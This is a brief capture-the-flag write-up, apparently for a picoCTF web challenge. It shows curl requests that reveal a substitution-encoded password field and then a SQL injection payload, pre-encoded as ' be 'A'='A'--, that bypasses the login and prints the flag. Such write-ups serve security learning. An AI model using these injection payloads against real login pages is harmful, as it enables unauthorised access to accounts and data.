Doing 

```
curl https://jupiter.challenges.picoctf.org/problem/54253/login.php --data "password=teste&debug=1"
```


we can see the password is being encrypted and seems like is someking of substituition cypher

trying a simple sql injection:

```
curl https://jupiter.challenges.picoctf.org/problem/54253/login.php --data "password=' OR 'A'=='A'--&debug=1
```

gives

```
<pre>password: ' OR 'A'=='A'
SQL query: SELECT * FROM admin where password = '' BE 'N'=='N''
```

which means that now we just need to change the OR in our sql for be like:

```
curl https://jupiter.challenges.picoctf.org/problem/54253/login.php --data "password=' be 'A'='A'--&debug=1"
```
and we get

```<pre>password: ' be 'A'='A'--
SQL query: SELECT * FROM admin where password = '' or 'N'='N'--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>
```
